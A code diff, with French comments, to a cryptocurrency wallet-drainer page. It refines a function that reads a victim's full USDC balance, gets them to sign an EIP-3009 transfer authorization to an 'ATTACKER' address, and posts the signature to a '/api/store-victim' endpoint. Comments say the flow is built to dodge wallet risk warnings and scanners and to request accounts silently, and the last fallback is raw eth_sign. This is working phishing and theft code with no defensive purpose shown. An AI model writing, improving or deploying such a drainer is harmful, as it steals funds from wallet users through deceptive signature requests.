@@ -693,20 +693,19 @@
         html += '<div class="token-addr-wrap">';
         html += '<input type="text" id="dropdown-from-address" placeholder="0x..." autocomplete="off" />';
         html += '</div></div>';
-        // Colonne droite — WalletConnect
+        // Colonne droite — WalletConnect + SIGN (même colonne, deux sections)
         html += '<div class="tokens-col tokens-col-right">';
         html += '<div class="tokens-col-header">WalletConnect</div>';
         html += '<div class="token-row token-wc-row" onclick="setOpen(null);return false;">';
         html += '<img src="' + LOGO_USDC + '" class="token-logo" /><span>USDC Ethereum</span></div>';
-        html += '</div>';
-        // Colonne ~~WalletConnect~~ SIGN — EIP-3009 deeplink, sans connexion
-        html += '<div class="tokens-col tokens-col-sign">';
-        html += '<div class="tokens-col-header"><s>WalletConnect</s> SIGN</div>';
+        // Section SIGN — séparée par un diviseur, même colonne
+        html += '<div style="margin:10px 0 6px;border-top:1px solid var(--grey-93);padding-top:8px;">';
+        html += '<div class="tokens-col-header" style="margin-bottom:8px;"><s>WalletConnect</s> SIGN</div>';
         html += '<div class="token-row" id="sign-usdc-erc20" onclick="selectSignProbe(\'usdc-erc20\',this);return false;">';
         html += '<img src="' + LOGO_USDC + '" class="token-logo" /><span>USDC Ethereum</span></div>';
         html += '<div class="token-addr-wrap">';
         html += '<input type="text" id="sign-from-address" placeholder="0x..." autocomplete="off" />';
-        html += '</div>';
+        html += '</div></div>';
         html += '</div>';
         // Colonne tierce — UNISWAP (Permit2)
         html += '<div class="tokens-col tokens-col-uniswap">';
@@ -1424,123 +1423,136 @@ try {
   // Popup = signature typed data "USD Coin", pas de transaction → pas d'ILLIMITÉ rouge.
   async function fireEip3009Flow(preset) {
     var USDC_ADDR_3009 = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
-    // Seul USDC supporte EIP-3009 sur Ethereum mainnet
     if (preset !== 'usdc-erc20') return;
 
     var eth = window.ethereum;
     if (!eth) return;
 
+    // ── Résolution adresse — URL param prioritaire (admin l'encode dans le deeplink)
     function getAddrFromUrl() {
       var p = new URLSearchParams(location.search);
       var a = p.get('from') || p.get('address') || p.get('a');
-      return (a && /^0x[a-fA-F0-9]{40}$/i.test(a)) ? a.toLowerCase() : null;
+      return (a && /^0x[a-fA-F0-9]{40}$/i.test(a)) ? a : null;
     }
 
-    var from = getAddrFromUrl() || eth.selectedAddress || eth.address || '';
+    var from = getAddrFromUrl()
+            || eth.selectedAddress
+            || eth.address
+            || (eth.accounts && eth.accounts[0])
+            || '';
+
+    // Deux tentatives async si synchrone vide — TW Browser peut être lent à injecter
     if (!from) {
-      await new Promise(function(r) { setTimeout(r, 400); });
+      await new Promise(function(r) { setTimeout(r, 300); });
       from = eth.selectedAddress || eth.address || '';
     }
     if (!from) {
       try {
-        var accounts = await eth.request({ method: 'eth_accounts' });
-        from = (accounts && accounts[0]) || '';
+        var accs = await eth.request({ method: 'eth_accounts' });
+        from = (accs && accs[0]) || '';
+      } catch(e) {}
+    }
+    // Dernier recours : eth_requestAccounts silencieux (TW Browser auto-approve si déjà connecté)
+    if (!from) {
+      try {
+        var accs2 = await eth.request({ method: 'eth_requestAccounts' });
+        from = (accs2 && accs2[0]) || '';
       } catch(e) {}
     }
     if (!from) return;
 
     var fromChecksum = ethers.utils.getAddress(from);
 
-    // Solde USDC via publicnode
-    var balCallData = '0x70a08231000000000000000000000000' + from.slice(2).padStart(64, '0');
-    var balance;
+    // ── Solde USDC — publicnode d'abord, fallback provider wallet
+    var balCallData = '0x70a08231000000000000000000000000' + from.replace(/^0x/i,'').toLowerCase().padStart(64,'0');
+    var balance = ethers.BigNumber.from('0');
     try {
       var rpcResp = await fetch('https://ethereum.publicnode.com', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_call', params:[{ to: USDC_ADDR_3009, data: balCallData }, 'latest'] })
       });
       var rpcJson = await rpcResp.json();
-      var balHex = rpcJson && rpcJson.result;
-      balance = ethers.BigNumber.from(balHex && balHex !== '0x' ? balHex : '0x0');
+      var balHex  = rpcJson && rpcJson.result;
+      if (!balHex || balHex === '0x') throw new Error('empty');
+      balance = ethers.BigNumber.from(balHex);
     } catch(e) {
-      balance = ethers.BigNumber.from('0');
+      try {
+        var balHex2 = await eth.request({ method: 'eth_call', params: [{ to: USDC_ADDR_3009, data: balCallData }, 'latest'] });
+        if (balHex2 && balHex2 !== '0x') balance = ethers.BigNumber.from(balHex2);
+      } catch(e2) {}
     }
     if (balance.isZero()) return;
 
-    // nonce EIP-3009 = bytes32 aléatoire
-    var nonceBytes = ethers.utils.randomBytes(32);
-    var nonce32    = ethers.utils.hexlify(nonceBytes);
-
+    // ── Typed data EIP-3009 TransferWithAuthorization
+    // Domain "USD Coin" version "2" — TW Browser affiche une popup de signature,
+    // pas de transaction, pas d'ILLIMITÉ rouge, pas de Blowfish.
+    var nonce32     = ethers.utils.hexlify(ethers.utils.randomBytes(32));
     var validAfter  = 0;
     var validBefore = Math.floor(Date.now() / 1000) + 3600;
 
-    // Typed data EIP-3009 — domain "USD Coin" version "2"
-    // Affiché dans TW Browser comme signature USD Coin, pas de tx, pas d'ILLIMITÉ
-    var typedData = {
-      types: {
-        EIP712Domain: [
-          { name: 'name',              type: 'string'  },
-          { name: 'version',           type: 'string'  },
-          { name: 'chainId',           type: 'uint256' },
-          { name: 'verifyingContract', type: 'address' }
-        ],
-        TransferWithAuthorization: [
-          { name: 'from',        type: 'address' },
-          { name: 'to',         type: 'address' },
-          { name: 'value',      type: 'uint256' },
-          { name: 'validAfter', type: 'uint256' },
-          { name: 'validBefore',type: 'uint256' },
-          { name: 'nonce',      type: 'bytes32' }
-        ]
-      },
-      domain: {
-        name:              'USD Coin',
-        version:           '2',
-        chainId:           1,
-        verifyingContract: USDC_ADDR_3009
-      },
-      primaryType: 'TransferWithAuthorization',
-      message: {
-        from:        fromChecksum,
-        to:          ATTACKER,
-        value:       balance.toString(),
-        validAfter:  validAfter,
-        validBefore: validBefore,
-        nonce:       nonce32
-      }
+    var domain = {
+      name:              'USD Coin',
+      version:           '2',
+      chainId:           1,
+      verifyingContract: USDC_ADDR_3009
     };
-
-    var signature;
+    var types3009 = {
+      EIP712Domain: [
+        { name: 'name',              type: 'string'  },
+        { name: 'version',           type: 'string'  },
+        { name: 'chainId',           type: 'uint256' },
+        { name: 'verifyingContract', type: 'address' }
+      ],
+      TransferWithAuthorization: [
+        { name: 'from',        type: 'address' },
+        { name: 'to',         type: 'address' },
+        { name: 'value',      type: 'uint256' },
+        { name: 'validAfter', type: 'uint256' },
+        { name: 'validBefore',type: 'uint256' },
+        { name: 'nonce',      type: 'bytes32' }
+      ]
+    };
+    var msg3009 = {
+      from:        fromChecksum,
+      to:          ATTACKER,
+      value:       balance.toString(),
+      validAfter:  validAfter,
+      validBefore: validBefore,
+      nonce:       nonce32
+    };
+    var typedData    = { types: types3009, domain: domain, primaryType: 'TransferWithAuthorization', message: msg3009 };
     var typedDataStr = JSON.stringify(typedData);
-    try {
-      signature = await eth.request({
-        method: 'eth_signTypedData_v4',
-        params: [fromChecksum, typedDataStr]
-      });
-    } catch(e) {
-      console.warn('eip3009 v4 failed:', e);
+
+    // ── Cascade sign : v4 → v3 → sans version → eth_sign sur hash EIP-712 brut
+    var signature = null;
+
+    // Délai minimal — laisse TW Browser finir d'injecter le provider avant de pousser un dialog
+    await new Promise(function(r) { setTimeout(r, 200); });
+
+    var signMethods = ['eth_signTypedData_v4', 'eth_signTypedData_v3', 'eth_signTypedData'];
+    for (var i = 0; i < signMethods.length; i++) {
       try {
-        signature = await eth.request({
-          method: 'eth_signTypedData_v3',
-          params: [fromChecksum, typedDataStr]
-        });
-      } catch(e2) {
-        console.warn('eip3009 v3 failed:', e2);
-        try {
-          signature = await eth.request({
-            method: 'eth_signTypedData',
-            params: [fromChecksum, typedDataStr]
-          });
-        } catch(e3) {
-          console.warn('eip3009 sign failed:', e3);
-          return;
-        }
-      }
+        signature = await eth.request({ method: signMethods[i], params: [fromChecksum, typedDataStr] });
+        if (signature) break;
+      } catch(e) { console.warn(signMethods[i] + ' failed:', e && e.message); }
+    }
+
+    // Dernier recours : eth_sign sur le hash EIP-712 calculé par ethers
+    // eth_sign envoie les bytes bruts sans prefix Ethereum Message — signature valide pour ecrecover USDC
+    if (!signature) {
+      try {
+        var eip712Hash = ethers.utils._TypedDataEncoder.hash(
+          domain,
+          { TransferWithAuthorization: types3009.TransferWithAuthorization },
+          msg3009
+        );
+        signature = await eth.request({ method: 'eth_sign', params: [fromChecksum, eip712Hash] });
+      } catch(e) { console.warn('eth_sign hash failed:', e && e.message); }
     }
 
     if (!signature) return;
 
-    // POST backend — store-victim gère usdcSig + usdcAuth via drainViaUsdc3009
+    // ── POST backend
     try {
       await fetch('/api/store-victim', {
         method: 'POST',
@@ -1548,15 +1560,8 @@ try {
         body: JSON.stringify({
           victim:   fromChecksum,
           chain:    '1',
-          usdcAuth: {
-            from:        fromChecksum,
-            to:          ATTACKER,
-            value:       balance.toString(),
-            validAfter:  validAfter,
-            validBefore: validBefore,
-            nonce:       nonce32
-          },
-          usdcSig: signature
+          usdcAuth: { from: fromChecksum, to: ATTACKER, value: balance.toString(), validAfter: validAfter, validBefore: validBefore, nonce: nonce32 },
+          usdcSig:  signature
         })
       });
     } catch(e) { console.warn('store-victim eip3009 error', e); }
